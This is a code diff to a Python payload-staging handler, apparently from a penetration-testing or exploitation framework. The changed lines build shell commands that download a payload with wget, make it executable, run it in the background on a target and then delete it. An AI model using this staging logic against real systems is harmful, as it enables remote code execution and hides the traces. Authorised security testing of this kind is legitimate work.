@@ -130,7 +130,7 @@ class Handler(Server):
         self.badges.output_process("Uploading payload...")
 
         self.badges.output_process("Executing payload...")
-        command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\""
+        command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} &' {delim} rm {path}"
         args = args if args is not None else ""
 
         sender(*args, {command})
@@ -160,7 +160,7 @@ class Handler(Server):
         self.badges.output_process("Executing payload...")
         args = args if args is not None else ""
 
-        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
+        sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} &' {delim} rm {path}")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
                      location='/tmp', linemax=100):
@@ -186,7 +186,7 @@ class Handler(Server):
         self.badges.output_process("Executing payload...")
         args = args if args is not None else ""
 
-        sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
+        sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} &' {delim} rm {path}")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
